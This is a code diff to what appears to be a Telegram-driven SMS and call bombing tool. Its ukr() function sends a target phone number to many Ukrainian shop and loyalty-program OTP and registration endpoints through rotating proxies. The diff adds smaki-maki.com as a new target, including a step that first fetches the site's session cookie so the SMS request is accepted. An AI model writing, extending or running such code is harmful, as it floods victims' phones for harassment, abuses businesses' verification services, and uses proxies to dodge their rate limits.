@@ -16,7 +16,7 @@ from headers_main import (
     headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
     headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
     headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
-    cookies_elmir_call
+    cookies_elmir_call, headers_smaki, cookies_smaki
 )
 import asyncpg
 import config
@@ -291,8 +291,9 @@ def load_proxies_from_file(path: str = "proxy.txt"):
 
 def build_proxy_params(entry):
     try:
+        # Використовуємо http:// для проксі (aiohttp автоматично підтримує HTTPS через CONNECT)
         url = f"http://{entry['host']}:{entry['port']}"
-        auth = BasicAuth(entry["user"], entry["password"]) if entry.get("user") else None
+        auth = BasicAuth(entry["user"], entry["password"]) if entry.get("user") and entry.get("password") else None
         return url, auth
     except Exception:
         return None, None
@@ -1228,6 +1229,25 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         return
 
     logging.info(f"Отримано CSRF-токен: {csrf_token}")
+    
+    # Отримуємо OCSESSID cookie для smaki-maki
+    smaki_session_id = None
+    try:
+        timeout = aiohttp.ClientTimeout(total=5)
+        async with aiohttp.ClientSession(timeout=timeout, cookies=cookies_smaki) as session:
+            async with session.get("https://smaki-maki.com/", headers=headers_smaki, proxy=proxy_url, proxy_auth=proxy_auth) as resp:
+                if resp.status == 200:
+                    cookies_from_resp = resp.cookies
+                    if 'OCSESSID' in cookies_from_resp:
+                        smaki_session_id = cookies_from_resp['OCSESSID'].value
+                        logging.info(f"Отримано OCSESSID для smaki-maki: {smaki_session_id[:10]}...")
+    except Exception as e:
+        logging.error(f"Помилка отримання OCSESSID: {e}")
+    
+    # Оновлюємо cookies для smaki-maki з отриманим OCSESSID
+    smaki_cookies_final = cookies_smaki.copy()
+    if smaki_session_id:
+        smaki_cookies_final['OCSESSID'] = smaki_session_id
 
     formatted_number = f"+{number[:2]} {number[2:5]} {number[5:8]} {number[8:10]} {number[10:]}"
     formatted_number2 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:10]}+{number[10:]}"
@@ -1319,7 +1339,8 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir})),
         bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, "headers": headers_elmir_call, "cookies": cookies_elmir_call})),
         bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", **with_proxy({"method": 'GET', "headers": headers})),
-        bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers}))
+        bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
+        bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": "", "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
     ]
 
     if not attack_flags.get(chat_id):
